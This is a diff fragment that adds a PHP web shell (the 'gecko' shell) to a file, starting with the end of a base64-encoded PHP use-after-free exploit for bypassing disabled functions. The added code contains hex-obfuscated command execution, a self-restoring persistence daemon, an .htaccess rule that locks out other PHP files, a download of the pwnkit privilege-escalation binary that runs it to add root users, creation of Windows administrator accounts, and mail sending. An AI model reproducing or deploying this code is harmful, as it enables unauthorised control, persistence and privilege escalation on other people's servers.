DwgJG47ICRpKyspIHsKICAgICAgICAgICAgJHN0clskcCArICRpXSA9IGNocigkdiAmIDB4ZmYpOwogICAgICAgICAgICAkdiA+Pj0gODsKICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gbGVhaygkYWRkciwgJHAgPSAwLCAkcyA9IDgpIHsKICAgICAgICBnbG9iYWwgJGFiYywgJGhlbHBlcjsKICAgICAgICB3cml0ZSgkYWJjLCAweDY4LCAkYWRkciArICRwIC0gMHgxMCk7CiAgICAgICAgJGxlYWsgPSBzdHJsZW4oJGhlbHBlci0+YSk7CiAgICAgICAgaWYoJHMgIT0gOCkgeyAkbGVhayAlPSAyIDw8ICgkcyAqIDgpIC0gMTsgfQogICAgICAgIHJldHVybiAkbGVhazsKICAgIH0KCiAgICBmdW5jdGlvbiBwYXJzZV9lbGYoJGJhc2UpIHsKICAgICAgICAkZV90eXBlID0gbGVhaygkYmFzZSwgMHgxMCwgMik7CgogICAgICAgICRlX3Bob2ZmID0gbGVhaygkYmFzZSwgMHgyMCk7CiAgICAgICAgJGVfcGhlbnRzaXplID0gbGVhaygkYmFzZSwgMHgzNiwgMik7CiAgICAgICAgJGVfcGhudW0gPSBsZWFrKCRiYXNlLCAweDM4LCAyKTsKCiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkZV9waG51bTsgJGkrKykgewogICAgICAgICAgICAkaGVhZGVyID0gJGJhc2UgKyAkZV9waG9mZiArICRpICogJGVfcGhlbnRzaXplOwogICAgICAgICAgICAkcF90eXBlICA9IGxlYWsoJGhlYWRlciwgMCwgNCk7CiAgICAgICAgICAgICRwX2ZsYWdzID0gbGVhaygkaGVhZGVyLCA0LCA0KTsKICAgICAgICAgICAgJHBfdmFkZHIgPSBsZWFrKCRoZWFkZXIsIDB4MTApOwogICAgICAgICAgICAkcF9tZW1zeiA9IGxlYWsoJGhlYWRlciwgMHgyOCk7CgogICAgICAgICAgICBpZigkcF90eXBlID09IDEgJiYgJHBfZmxhZ3MgPT0gNikgeyAjIFBUX0xPQUQsIFBGX1JlYWRfV3JpdGUKICAgICAgICAgICAgICAgICMgaGFuZGxlIHBpZQogICAgICAgICAgICAgICAgJGRhdGFfYWRkciA9ICRlX3R5cGUgPT0gMiA/ICRwX3ZhZGRyIDogJGJhc2UgKyAkcF92YWRkcjsKICAgICAgICAgICAgICAgICRkYXRhX3NpemUgPSAkcF9tZW1zejsKICAgICAgICAgICAgfSBlbHNlIGlmKCRwX3R5cGUgPT0gMSAmJiAkcF9mbGFncyA9PSA1KSB7ICMgUFRfTE9BRCwgUEZfUmVhZF9leGVjCiAgICAgICAgICAgICAgICAkdGV4dF9zaXplID0gJHBfbWVtc3o7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmKCEkZGF0YV9hZGRyIHx8ICEkdGV4dF9zaXplIHx8ICEkZGF0YV9zaXplKQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CgogICAgICAgIHJldHVybiBbJGRhdGFfYWRkciwgJHRleHRfc2l6ZSwgJGRhdGFfc2l6ZV07CiAgICB9CgogICAgZnVuY3Rpb24gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSB7CiAgICAgICAgbGlzdCgkZGF0YV9hZGRyLCAkdGV4dF9zaXplLCAkZGF0YV9zaXplKSA9ICRlbGY7CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkZGF0YV9zaXplIC8gODsgJGkrKykgewogICAgICAgICAgICAkbGVhayA9IGxlYWsoJGRhdGFfYWRkciwgJGkgKiA4KTsKICAgICAgICAgICAgaWYoJGxlYWsgLSAkYmFzZSA+IDAgJiYgJGxlYWsgLSAkYmFzZSA8ICRkYXRhX2FkZHIgLSAkYmFzZSkgewogICAgICAgICAgICAgICAgJGRlcmVmID0gbGVhaygkbGVhayk7CiAgICAgICAgICAgICAgICAjICdjb25zdGFudCcgY29uc3RhbnQgY2hlY2sKICAgICAgICAgICAgICAgIGlmKCRkZXJlZiAhPSAweDc0NmU2MTc0NzM2ZTZmNjMpCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0gZWxzZSBjb250aW51ZTsKCiAgICAgICAgICAgICRsZWFrID0gbGVhaygkZGF0YV9hZGRyLCAoJGkgKyA0KSAqIDgpOwogICAgICAgICAgICBpZigkbGVhayAtICRiYXNlID4gMCAmJiAkbGVhayAtICRiYXNlIDwgJGRhdGFfYWRkciAtICRiYXNlKSB7CiAgICAgICAgICAgICAgICAkZGVyZWYgPSBsZWFrKCRsZWFrKTsKICAgICAgICAgICAgICAgICMgJ2JpbjJoZXgnIGNvbnN0YW50IGNoZWNrCiAgICAgICAgICAgICAgICBpZigkZGVyZWYgIT0gMHg3ODY1NjgzMjZlNjk2MikKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfSBlbHNlIGNvbnRpbnVlOwoKICAgICAgICAgICAgcmV0dXJuICRkYXRhX2FkZHIgKyAkaSAqIDg7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspIHsKICAgICAgICAkYmFzZSA9IDA7CiAgICAgICAgJHN0YXJ0ID0gJGJpbmFyeV9sZWFrICYgMHhmZmZmZmZmZmZmZmZmMDAwOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgMHgxMDAwOyAkaSsrKSB7CiAgICAgICAgICAgICRhZGRyID0gJHN0YXJ0IC0gMHgxMDAwICogJGk7CiAgICAgICAgICAgICRsZWFrID0gbGVhaygkYWRkciwgMCwgNyk7CiAgICAgICAgICAgIGlmKCRsZWFrID09IDB4MTAxMDI0NjRjNDU3ZikgeyAjIEVMRiBoZWFkZXIKICAgICAgICAgICAgICAgIHJldHVybiAkYWRkcjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykgewogICAgICAgICRhZGRyID0gJGJhc2ljX2Z1bmNzOwogICAgICAgIGRvIHsKICAgICAgICAgICAgJGZfZW50cnkgPSBsZWFrKCRhZGRyKTsKICAgICAgICAgICAgJGZfbmFtZSA9IGxlYWsoJGZfZW50cnksIDAsIDYpOwoKICAgICAgICAgICAgaWYoJGZfbmFtZSA9PSAweDZkNjU3NDczNzk3MykgeyAjIHN5c3RlbQogICAgICAgICAgICAgICAgcmV0dXJuIGxlYWsoJGFkZHIgKyA4KTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkYWRkciArPSAweDIwOwogICAgICAgIH0gd2hpbGUoJGZfZW50cnkgIT0gMCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIGZ1bmN0aW9uIHRyaWdnZXJfdWFmKCRhcmcpIHsKICAgICAgICAjIHN0cl9zaHVmZmxlIHByZXZlbnRzIG9wY2FjaGUgc3RyaW5nIGludGVybmluZwogICAgICAgICRhcmcgPSBzdHJfc2h1ZmZsZShzdHJfcmVwZWF0KCdBJywgNzkpKTsKICAgICAgICAkdnVsbiA9IG5ldyBWdWxuKCk7CiAgICAgICAgJHZ1bG4tPmEgPSAkYXJnOwogICAgfQoKICAgIGlmKHN0cmlzdHIoUEhQX09TLCAnV0lOJykpIHsKICAgICAgICBkaWUoJ1RoaXMgUG9DIGlzIGZvciAqbml4IHN5c3RlbXMgb25seS4nKTsKICAgIH0KCiAgICAkbl9hbGxvYyA9IDEwOyAjIGluY3JlYXNlIHRoaXMgdmFsdWUgaWYgVUFGIGZhaWxzCiAgICAkY29udGlndW91cyA9IFtdOwogICAgZm9yKCRpID0gMDsgJGkgPCAkbl9hbGxvYzsgJGkrKykKICAgICAgICAkY29udGlndW91c1tdID0gc3RyX3NodWZmbGUoc3RyX3JlcGVhdCgnQScsIDc5KSk7CgogICAgdHJpZ2dlcl91YWYoJ3gnKTsKICAgICRhYmMgPSAkYmFja3RyYWNlWzFdWydhcmdzJ11bMF07CgogICAgJGhlbHBlciA9IG5ldyBIZWxwZXI7CiAgICAkaGVscGVyLT5iID0gZnVuY3Rpb24gKCR4KSB7IH07CgogICAgaWYoc3RybGVuKCRhYmMpID09IDc5IHx8IHN0cmxlbigkYWJjKSA9PSAwKSB7CiAgICAgICAgZGllKCJVQUYgZmFpbGVkIik7CiAgICB9CgogICAgIyBsZWFrcwogICAgJGNsb3N1cmVfaGFuZGxlcnMgPSBzdHIycHRyKCRhYmMsIDApOwogICAgJHBocF9oZWFwID0gc3RyMnB0cigkYWJjLCAweDU4KTsKICAgICRhYmNfYWRkciA9ICRwaHBfaGVhcCAtIDB4Yzg7CgogICAgIyBmYWtlIHZhbHVlCiAgICB3cml0ZSgkYWJjLCAweDYwLCAyKTsKICAgIHdyaXRlKCRhYmMsIDB4NzAsIDYpOwoKICAgICMgZmFrZSByZWZlcmVuY2UKICAgIHdyaXRlKCRhYmMsIDB4MTAsICRhYmNfYWRkciArIDB4NjApOwogICAgd3JpdGUoJGFiYywgMHgxOCwgMHhhKTsKCiAgICAkY2xvc3VyZV9vYmogPSBzdHIycHRyKCRhYmMsIDB4MjApOwoKICAgICRiaW5hcnlfbGVhayA9IGxlYWsoJGNsb3N1cmVfaGFuZGxlcnMsIDgpOwogICAgaWYoISgkYmFzZSA9IGdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgZGV0ZXJtaW5lIGJpbmFyeSBiYXNlIGFkZHJlc3MiKTsKICAgIH0KCiAgICBpZighKCRlbGYgPSBwYXJzZV9lbGYoJGJhc2UpKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgcGFyc2UgRUxGIGhlYWRlciIpOwogICAgfQoKICAgIGlmKCEoJGJhc2ljX2Z1bmNzID0gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSkpIHsKICAgICAgICBkaWUoIkNvdWxkbid0IGdldCBiYXNpY19mdW5jdGlvbnMgYWRkcmVzcyIpOwogICAgfQoKICAgIGlmKCEoJHppZl9zeXN0ZW0gPSBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykpKSB7CiAgICAgICAgZGllKCJDb3VsZG4ndCBnZXQgemlmX3N5c3RlbSBhZGRyZXNzIik7CiAgICB9CgogICAgIyBmYWtlIGNsb3N1cmUgb2JqZWN0CiAgICAkZmFrZV9vYmpfb2Zmc2V0ID0gMHhkMDsKICAgIGZvcigkaSA9IDA7ICRpIDwgMHgxMTA7ICRpICs9IDgpIHsKICAgICAgICB3cml0ZSgkYWJjLCAkZmFrZV9vYmpfb2Zmc2V0ICsgJGksIGxlYWsoJGNsb3N1cmVfb2JqLCAkaSkpOwogICAgfQoKICAgICMgcHduCiAgICB3cml0ZSgkYWJjLCAweDIwLCAkYWJjX2FkZHIgKyAkZmFrZV9vYmpfb2Zmc2V0KTsKICAgIHdyaXRlKCRhYmMsIDB4ZDAgKyAweDM4LCAxLCA0KTsgIyBpbnRlcm5hbCBmdW5jIHR5cGUKICAgIHdyaXRlKCRhYmMsIDB4ZDAgKyAweDY4LCAkemlmX3N5c3RlbSk7ICMgaW50ZXJuYWwgZnVuYyBoYW5kbGVyCgogICAgKCRoZWxwZXItPmIpKCRjbWRkKTsKfQ==';
+        $fungsi[28](".term-bypass", base64_decode($connt));
     }
 }
 
-termInput.addEventListener('keydown', function(e) {
-    if (e.key === 'Enter') {
-        e.preventDefault();
-        const cmd = termInput.value;
-        termInput.value = '';
-        termRun(cmd);
-    } else if (e.key === 'ArrowUp') {
-        e.preventDefault();
-        if (termHistory.length === 0) return;
-        if (termHistIdx > 0) termHistIdx--;
-        termInput.value = termHistory[termHistIdx] || '';
-        setTimeout(() => termInput.setSelectionRange(termInput.value.length, termInput.value.length), 0);
-    } else if (e.key === 'ArrowDown') {
-        e.preventDefault();
-        if (termHistory.length === 0) return;
-        if (termHistIdx < termHistory.length - 1) {
-            termHistIdx++;
-            termInput.value = termHistory[termHistIdx] || '';
+
+if (isset($_GET['lockshell'])) {
+    $curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
+    $TmpNames = $fungsi[31]();
+    if (file_exists($TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile)  . '-handler')) && file_exists($TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text'))) {
+        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text'));
+        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-handler'));
+    }
+    mkdir($TmpNames . "/.sessions");
+    cmd("cp $curFile " . $TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text'));
+    chmod($curFile, 0444);
+    $handler = '
+<?php
+@ini_set("max_execution_time", 0);
+while (True){
+    if (!file_exists("' . __DIR__ . '")){
+        mkdir("' . __DIR__ . '");
+    }
+    if (!file_exists("' . $fungsi[0]() . '/' . $curFile . '")){
+        $text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text') . '"));
+        file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", base64_decode($text));
+    }
+    if (gecko_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
+        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
+    }
+    if (gecko_perm("' . __DIR__ . '") != 0555){
+        chmod("' . __DIR__ . '", 0555);
+    }
+}
+
+function gecko_perm($flename){
+    return substr(sprintf("%o", fileperms($flename)), -4);
+}
+';
+    $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($curFile)  . '-handler') . "", $handler);
+    if ($hndlers) {
+        cmd(PHP_BINARY .' ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
+        success();
+    } else {
+        failed();
+    }
+}
+if (isset($_POST['gecko-up-submit'])) {
+    $namaFilenya = $_FILES['gecko-upload']['name'];
+    $tmpName = $_FILES['gecko-upload']['tmp_name'];
+    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
+        success();
+    } else {
+        failed();
+    }
+}
+
+if ($_GET['logout'] == True) {
+    session_destroy();
+    session_unset();
+    success();
+}
+
+if (isset($_GET['destroy'])) {
+    $DOC_ROOT = $_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];
+    $CurrentFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
+    if ($fungsi[4]($DOC_ROOT)) {
+        $htaccess = '
+<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
+    Deny from all
+</FilesMatch>
+<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php)$">
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
+    Allow from all
+</FilesMatch>';
+        $put_htt = $fungsi[28]($DOC_ROOT . "/.htaccess", $htaccess);
+        if ($put_htt) {
+            success();
         } else {
-            termHistIdx = termHistory.length;
-            termInput.value = '';
+            failed();
         }
-    } else if (e.ctrlKey && (e.key === 'l' || e.key === 'L')) {
-        e.preventDefault();
-        termClear();
-    } else if (e.key === 'Escape') {
-        closeTerminal();
+    } else {
+        failed();
     }
-});
+}
 
-// Auto-focus kalau klik di body terminal
-termBody.addEventListener('click', function(e) {
-    if (e.target === termBody) termInput.focus();
-});
-</script>
-</body></html>
+
+if (isset($_POST['save-editor'])) {
+    $save = $fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor']);
+    if ($save) {
+        success();
+    } else {
+        failed();
+    }
+}
+
+if (isset($_GET['adminer'])) {
+    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
+    if (!$fungsi[3]('adminer.php')) {
+        cmd('wget ' . $URL . ' -O adminer.php --quiet');
+        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '">';
+    }
+}
+
+
+if ($_GET['terminal'] == "root") {
+    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
+        cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O pwnkit');
+        cmd('chmod +x pwnkit');
+        echo cmd('./pwnkit id > .mad-root');
+        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
+    }
+}
+
+if (isset($_POST['submit-action'])) {
+    $items = $_POST['check'];
+    if ($_POST['gecko-select'] == "delete") {
+        foreach ($items as $it) {
+            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
+            $fd = $repl . "/" . $it;
+            if (is_dir($fd) || is_file($fd)) {
+                $rmdir = unlinkDir($fd);
+                $rmfile = $fungsi[24]($fd);
+                if ($rmdir || $rmfile) {
+                    success();
+                } else if ($rmdir && $rmfile) {
+                    success();
+                } else {
+                    failed();
+                }
+            }
+        }
+    }
+}
+
+if (isset($_POST['submit'])) {
+    if ($_POST['create_folder'] == true) {
+        $NamaFolder = $fungsi[12]($_POST['create_folder']);
+        if ($NamaFolder) {
+            success();
+        } else {
+            failed();
+        }
+    } else if ($_POST['create_file'] == true) {
+        $namaFile = $fungsi[13]($_POST['create_file']);
+        if ($namaFile) {
+            success();
+        } else {
+            failed();
+        }
+    } else if ($_POST['renameFile'] == true) {
+        $renameFile = $fungsi[15](unx($_GET['re']), $_POST['renameFile']);
+        if ($renameFile) {
+            success();
+        } else {
+            failed();
+        }
+    } else if ($_POST['chFile']) {
+        $chFiles = $fungsi[30](unx($_GET['ch']), $_POST['chFile']);
+        if ($chFiles) {
+            success();
+        } else {
+            failed();
+        }
+    } else if (isset($_POST['add-username']) && isset($_POST['add-password'])) {
+        if (!$fungsi[3]('pwnkit')) {
+            cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O pwnkit');
+            cmd('chmod +x pwnkit');
+            cmd('./pwnkit "id" > .mad-root');
+            echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
+        } else if ($fungsi[3]('.mad-root')) {
+            $response = $fungsi[11]('.mad-root');
+            $r_text = explode(" ", $response);
+            if ($r_text[0] == "uid=0(root)") {
+                $username = $_POST['add-username'];
+                $password = $_POST['add-password'];
+                cmd('./pwnkit "useradd ' . $username . ' ; echo -e "' . $password . '\n' . $password . '" | passwd ' . $username . '"');
+            } else {
+                echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&adduser=failed">';
+            }
+        }
+    } else if ($_POST['lockfile'] == true) {
+        $flesName = $_POST['lockfile'];
+        $TmpNames = $fungsi[31]();
+        if (file_exists($TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
+            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file'));
+            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler'));
+        }
+        mkdir($TmpNames . "/.sessions");
+        cmd("cp $flesName " . $TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file'));
+        chmod($flesName, 0444);
+        $handler = '
+<?php
+@ini_set("max_execution_time", 0);
+while (True){
+    if (!file_exists("' . $fungsi[0]() . '")){
+        mkdir("' . $fungsi[0]() . '");
+    }
+    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")){
+        $text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
+        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", base64_decode($text));
+    }
+    if (gecko_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
+        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
+    } 
+    if (gecko_perm("' . $fungsi[0]() . '") != 0555){
+        chmod("' . $fungsi[0]() . '", 0555);
+    }
+}
+
+function gecko_perm($flename){
+    return substr(sprintf("%o", fileperms($flename)), -4);
+}
+';
+        $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler') . "", $handler);
+        if ($hndlers) {
+            cmd(PHP_BINARY .' '. $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &');
+        } else {
+            failed();
+        }
+    } else if ($_POST['lockfile'] == true) {
+        $flesName = $_POST['lockfile'];
+        $TmpNames = $fungsi[31]();
+        if (file_exists($TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
+            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file'));
+            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler'));
+        }
+        mkdir($TmpNames . "/.sessions");
+        cmd("cp $flesName " . $TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file'));
+        chmod($flesName, 0444);
+        $handler = '
+<?php
+@ini_set("max_execution_time", 0);
+while (True){
+    if (!file_exists("' . $fungsi[0]() . '")){
+        mkdir("' . $fungsi[0]() . '");
+    }
+    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")){
+        $text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
+        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", base64_decode($text));
+    }
+    if (gecko_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
+        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
+    }
+}
+
+function gecko_perm($flename){
+    return substr(sprintf("%o", fileperms($flename)), -4);
+}
+';
+        $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler') . "", $handler);
+        if ($hndlers) {
+            cmd('php ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &');
+        } else {
+            failed();
+        }
+    } else if ($_POST['lock-windows'] == True) {
+        $NameWin = $_POST['lock-windows'];
+        $tmpPath = str_replace("\\", "/", $fungsi[31]());
+        if (strstr($fungsi[8](), "NT")) {
+            // Menghapus file
+            if (file_exists($tmpPath . '/.sessions/.' . remove_slash(winpwd() . $NameWin) . 'text') && file_exists($tmpPath . "/.sessions/." . remove_slash(winpwd() . $NameWin) . "handler")) {
+                unlink($tmpPath . '/.sessions/.' . remove_slash(winpwd() . $NameWin) . 'text');
+                unlink($tmpPath . "/.sessions/." . remove_slash(winpwd() . $NameWin) . "handler");
+            }
+
+            // Membuat File
+            mkdir($tmpPath . "/.sessions");
+            copy($NameWin, $tmpPath . "/.sessions/." . remove_slash(winpwd()  . $NameWin) . "text");
+
+            $putcontent = $fungsi[28]($tmpPath . "/.sessions/." . remove_slash(winpwd() . $NameWin) . "handler", '
+<?php
+
+chmod("' . winpwd() . '/' . $NameWin . '", 0444);
+while (True)
+{
+    if (!file_exists("' . winpwd() . '")){
+        mkdir("' . winpwd() . '");
+    }
+    if (!file_exists("' . winpwd() . '/' . $NameWin . '")){
+        $text = base64_encode(file_get_contents("' . $tmpPath . '/.sessions/.' . remove_slash(winpwd() . $NameWin) . 'text"));
+        $target = "' . winpwd() . '/' . $NameWin . '";
+        file_put_contents($target, base64_decode($text));
+    }
+    if (gecko_perm("' . winpwd() . '/' . $NameWin . '") != 0444){
+        chmod("' . winpwd() . '/' . $NameWin . '", 0444);
+    }
+    if (gecko_perm("' . winpwd() . '") != 0444){
+        chmod("' . winpwd() . '", 0444);
+    }
+    
+}
+
+function gecko_perm($flename)
+{
+    return substr(sprintf("%o", fileperms($flename)), -4);
+}
+    ');
+            if ($putcontent) {
+                if (check_xampp() == True) {
+                    $phpX = getc() . ":/xampp/php/php.exe";
+                    session_unset();
+                    session_destroy();
+                    echo cmd($phpX . ' "' . $tmpPath . "/.sessions/." . remove_slash(winpwd() . $NameWin) . 'handler" &');
+                } else {
+                    session_unset();
+                    session_destroy();
+                    echo cmd(PHP_BINARY .' "' . $tmpPath . "/.sessions/." . remove_slash(winpwd() . $NameWin) . 'handler" &');
+                }
+            } else {
+                failed();
+            }
+        } else {
+            failed();
+        }
+    } else if ($_POST['add-rdp'] == True) {
+        $userRDP = $_POST['add-rdp'];
+        $passRDP = $_POST['add-rdp-pass'];
+        if (stristr(PHP_OS, "WIN")) {
+            $procRDP = cmd("net user " . $userRDP . " " . $passRDP . " /add");
+            if ($procRDP) {
+                cmd("net localgroup administrators " . $userRDP . " /add");
+                success();
+            } else {
+                failed();
+            }
+        } else {
+            failed();
+        }
+    } else if ($_POST['mail-from-smtp'] == True) {
+        $emailFrom = $_POST['mail-from-smtp'];
+        $emailTo = $_POST['mail-to-smtp'];
+        $emailSubject = $_POST['mailto-subject'];
+        $messageMail = $_POST['message-smtp'];
+        $headersMail = 'From: ' . $emailFrom . '' . "\r\n" .
+            'Reply-To: ' . $emailFrom . '' . "\r\n" .
+            'X-Mailer: PHP/' . phpversion();
+        $procMailSmTp = mail($emailTo, $emailSubject, $messageMail, $headersMail);
+        if ($procMailSmTp) {
+            success();
+        } else {
+            failed();
+        }
+    }
+}
+
+if ($_GET['response'] == "success") {
+    echo "<script>
+Swal.fire({
+    icon: 'success',
+    title: 'Sucesss...',
+    text: 'Done Success!',
+    confirmButtonColor: '#22242d',
+})</script>";
+} else if ($_GET['response'] == "failed") {
+    echo "<script>
+Swal.fire({
+    icon: 'error',
+    title: 'Failed...',
+    text: 'Something wrong!',
+    confirmButtonColor: '#22242d',
+})
+    </script>";
+}
+
+
+function success()
+{
+    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=success">';
+}
+function failed()
+{
+    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=failed">';
+}
+
+function formatSize($bytes)
+{
+    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
+    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
+    return (round($bytes, 2) . " " . $types[$i]);
+}
+
+
+function hx($n)
+{
+    $y = '';
+    for ($i = 0; $i < strlen($n); $i++) {
+        $y .= dechex(ord($n[$i]));
+    }
+    return $y;
+}
+function unx($y)
+{
+    $n = '';
+    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
+        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
+    }
+    return $n;
+}
+
+function suggest_exploit()
+{
+    $uname = $GLOBALS['fungsi'][8]();
+    $xplod = explode(" ", $uname);
+    $xpld = explode("-", $xplod[2]);
+    $pl = explode(".", $xpld[0]);
+    return $pl[0] . "." . $pl[1] . "." . $pl[2];
+}
+function s()
+{
+    $d0mains = @$GLOBALS['fungsi'][7]("/etc/named.conf", false);
+    if (!$d0mains) {
+        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
+        $GLOBALS["need_to_update_header"] = "true";
+    } else {
+        $count = 0;
+        foreach ($d0mains as $d0main) {
+            if (@strstr($d0main, "zone")) {
+                preg_match_all('#zone "(.*)"#', $d0main, $domains);
+                flush();
+                if (strlen(trim($domains[1][0])) > 2) {
+                    flush();
+                    $count++;
+                }
+            }
+        }
+        $dom = "$count Domain";
+    }
+    return $dom;
+}
+
+function cmd($in, $re = false)
+{
+    $out = '';
+    try {
+        if ($re) $in = $in . " 2>&1";
+        if (function_exists("\x65\x78\x65\x63")) {
+            @$GLOBALS['fungsi'][16]($in, $out);
+            $out = @join("\n", $out);
+        } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
+            ob_start();
+            @$GLOBALS['fungsi'][17]($in);
+            $out = ob_get_clean();
+        } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) {
+            ob_start();
+            @$GLOBALS['fungsi'][18]($in);
+            $out = ob_get_clean();
+        } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
+            $out = $GLOBALS['fungsi'][19]($in);
+        } elseif (function_exists("\x70\x6f\x70\x65\x6e") && function_exists("\x70\x63\x6c\x6f\x73\x65")) {
+            if (is_resource($f = @$GLOBALS['fungsi'][20]($in, "r"))) {
+                $out = "";
+                while (!@feof($f))
+                    $out .= fread($f, 1024);
+                $GLOBALS['fungsi'][21]($f);
+            }
